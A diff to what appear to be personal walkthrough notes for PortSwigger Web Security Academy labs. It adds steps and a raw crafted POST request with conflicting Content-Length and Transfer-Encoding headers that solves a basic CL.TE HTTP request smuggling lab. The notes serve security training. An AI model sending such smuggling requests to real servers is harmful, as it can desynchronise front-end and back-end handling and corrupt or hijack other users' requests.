@@ -37,3 +37,23 @@ TIP:- Use HTTP Rquest Smuggler extension.
      4. Send the requst and after it send the normal request and lab is solved.
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+#2 Lab: HTTP request smuggling, basic CL.TE vulnerability
+
+     1. Downgrade HTTP protocol to HTTP 1.1 using inspector and change request method to POST
+     2. Disable automatic update of Content-Length
+     3. Show non- printable characters
+     4. Then send the below request :-
+         POST / HTTP/1.1
+         Host: 0acf00940373f42281b020d5009000fb.web-security-academy.net
+         Content-Type: application/x-www-form-urlencoded
+         Content-Length: 6
+         Transfer-Encoding: chunked
+
+         0
+         
+         G 
+     5. Send the request and then send the normal request and lab is solved. but in normal request change HTTP method and GET to POST
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------
+
